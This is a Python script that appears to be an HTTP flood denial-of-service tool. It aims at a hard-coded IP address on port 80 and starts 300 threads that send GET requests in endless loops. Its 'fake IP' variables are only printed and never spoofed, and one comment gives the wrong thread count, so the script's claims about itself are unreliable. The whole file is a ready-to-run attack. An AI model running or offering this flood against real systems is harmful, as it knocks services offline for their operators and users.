import socket
import random
import threading

# Define the target server and port
target = "38.242.194.12"
port = 80  # HTTP typically uses port 80

# Define the first fake IP address
fake_ip1 = "20.205.61.143"

# Function to send HTTP GET requests with the first fake IP
def send_request_with_fake_ip1():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
            print(f"Sent request with fake IP: {fake_ip1}")
        except Exception as e:
            print("An error occurred:", str(e))

# Define the second fake IP address
fake_ip2 = "103.84.206.169"

# Function to send HTTP GET requests with the second fake IP
def send_request_with_fake_ip2():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
            print(f"Sent request with fake IP: {fake_ip2}")
        except Exception as e:
            print("An error occurred:", str(e))

# Define the third fake IP address
fake_ip3 = "101.37.18.10"

# Function to send HTTP GET requests with the third fake IP
def send_request_with_fake_ip3():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + target + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
            print(f"Sent request with fake IP: {fake_ip3}")
        except Exception as e:
            print("An error occurred:", str(e))

# Create and start 10 threads for each function
threads = []
for _ in range(100):
    thread1 = threading.Thread(target=send_request_with_fake_ip1)
    thread2 = threading.Thread(target=send_request_with_fake_ip2)
    thread3 = threading.Thread(target=send_request_with_fake_ip3)
    thread1.start()
    thread2.start()
    thread3.start()
    threads.append(thread1)
    threads.append(thread2)
    threads.append(thread3)

# Wait for all threads to finish (you can modify this logic as needed)
for thread in threads:
    thread.join()
